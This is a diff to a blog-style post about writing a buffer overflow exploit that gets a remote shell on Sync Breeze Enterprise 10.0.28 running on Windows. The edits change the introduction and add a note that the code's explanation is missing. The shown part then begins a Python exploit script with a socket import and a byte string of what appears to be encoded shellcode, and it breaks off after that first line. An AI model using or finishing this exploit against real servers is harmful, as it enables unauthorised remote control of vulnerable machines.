@@ -1,6 +1,7 @@
 ### Simple Buffer-Over-Flow on an webserver
-This is post is about making a buffer overflow exploit to get a shell.
+This is post is about making a buffer overflow exploit to get a remote shell.
 We will exploit Sync Breeze Enterprize 10.0.28 on a windows box.
+PS: This post is not updated. If I get time I will write the code's explaination. Thank you<3
 ```python
 import socket
 badchars=("\xba\xa7\x57\x4f\xe1\xda\xda\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
